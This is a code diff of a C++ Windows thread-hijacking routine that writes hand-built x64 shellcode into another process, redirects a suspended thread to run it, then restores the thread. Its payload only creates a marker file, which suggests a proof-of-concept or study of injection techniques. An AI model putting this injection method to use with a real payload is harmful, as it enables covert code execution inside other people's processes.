@@ -4,16 +4,17 @@
 
 using namespace std;
 
-BOOL ThreadHijack(HANDLE process, DWORD threadID) {
+int ThreadHijack(HANDLE process, DWORD threadID) {
 
+	FARPROC addrCloseHandle = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CloseHandle");
 	FARPROC addrCreateFileA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateFileA");
-    if (addrCreateFileA == NULL) {
+    if (addrCreateFileA == NULL || addrCloseHandle == NULL) {
         cout << "GetProcAddress returned NULL" << endl;
-        return FALSE;
+        return 1;
 	}
 	void* remoteMemory = VirtualAllocEx(process, NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (remoteMemory == NULL) {
-		return FALSE;
+		return 2;
 	}
 	
 
@@ -28,15 +29,21 @@ BOOL ThreadHijack(HANDLE process, DWORD threadID) {
         0x68, 0x80, 0x00, 0x00, 0x00,       // +39 push 0x80 (dwFlagsAndAttributes)
         0x68, 0x02, 0x00, 0x00, 0x00,       // +44 push 0x2 (dwCreationDisposition)
 		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // +49 mov rax (CreateFileA Process Address)
-		0x48, 0x83, 0xEC, 0x20,             // sub rsp, 0x20 (save 32 byte for Windows parameters - must be always done)
-		0xFF, 0xD0,                         // call rax
-		0x48, 0x83, 0xC4, 0x40,				// add rsp, 0x40 (0x20 + 3 Parameters + 8 Byte alignment buf)
+		0x48, 0x83, 0xEC, 0x20,             // +59 sub rsp, 0x20 (save 32 byte for Windows parameters - must be always done)
+		0xFF, 0xD0,                         // +63 call rax
+		0x48, 0x83, 0xC4, 0x40,				// +65 add rsp, 0x40 (0x20 + 3 Parameters + 8 Byte alignment buf)
+		0x48, 0x89, 0xC1,					// +69 mov rcx, rax (HANDLE of CreateFileA)
+		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // +72 mov rax (CloseHandle Process Address)
+		0x48, 0x83, 0xEC, 0x20,				// sub rsp 0x20
+		0xFF, 0xD0,							// call rax
+		0x48, 0x83, 0xC4, 0x20,				// add rsp, 0x20
         0xEB, 0xFE                          // nop + jmp rel8 -2
 	};
 	
 	*(DWORD64*)((PUCHAR)codeCave + 6) = (DWORD64)(ULONG_PTR)remoteMemory + sizeof(codeCave);
 	*(DWORD64*)((PUCHAR)codeCave + 16) = GENERIC_READ | GENERIC_WRITE;
     *(DWORD64*)((PUCHAR)codeCave + 51) = (DWORD64)(ULONG_PTR)addrCreateFileA;
+	*(DWORD64*)((PUCHAR)codeCave + 74) = (DWORD64)(ULONG_PTR)addrCloseHandle;
 	
 	const TCHAR filename[] = "hijackConfirmationFile";
 
@@ -46,11 +53,11 @@ BOOL ThreadHijack(HANDLE process, DWORD threadID) {
 	// suspend the thread and query its control context
 	HANDLE thread = OpenThread((THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT), false, threadID);
 	if (thread == NULL) {
-		return FALSE;
+		return 3;
 	}
 	DWORD ret = SuspendThread(thread);
 	if (ret == -1) {
-		return FALSE;
+		return 4;
 	}
 
 	CONTEXT tcInitial;
@@ -58,7 +65,7 @@ BOOL ThreadHijack(HANDLE process, DWORD threadID) {
 	CONTEXT tcCurrent;
 	tcInitial.ContextFlags = CONTEXT_ALL;
 	if (!GetThreadContext(thread, &tcInitial)) {
-		return FALSE;
+		return 5;
 	}
 	CopyMemory(&tcHijack, &tcInitial, sizeof(CONTEXT));
 	CopyMemory(&tcCurrent, &tcInitial, sizeof(CONTEXT));
@@ -66,11 +73,11 @@ BOOL ThreadHijack(HANDLE process, DWORD threadID) {
 	//hijack the thread
 	tcHijack.Rip = (DWORD64)remoteMemory;
 	if (!SetThreadContext(thread, &tcHijack)) {
-		return FALSE;
+		return 6;
 	}
 	ret = ResumeThread(thread);
 	if (ret == -1) {
-		return FALSE;
+		return 7;
 	}
 
 	//wait until the code cave did it's job
@@ -81,5 +88,5 @@ BOOL ThreadHijack(HANDLE process, DWORD threadID) {
 	SuspendThread(thread);
 	SetThreadContext(thread, &tcInitial);
 	ResumeThread(thread);
-	return TRUE;
+	return 0;
 }
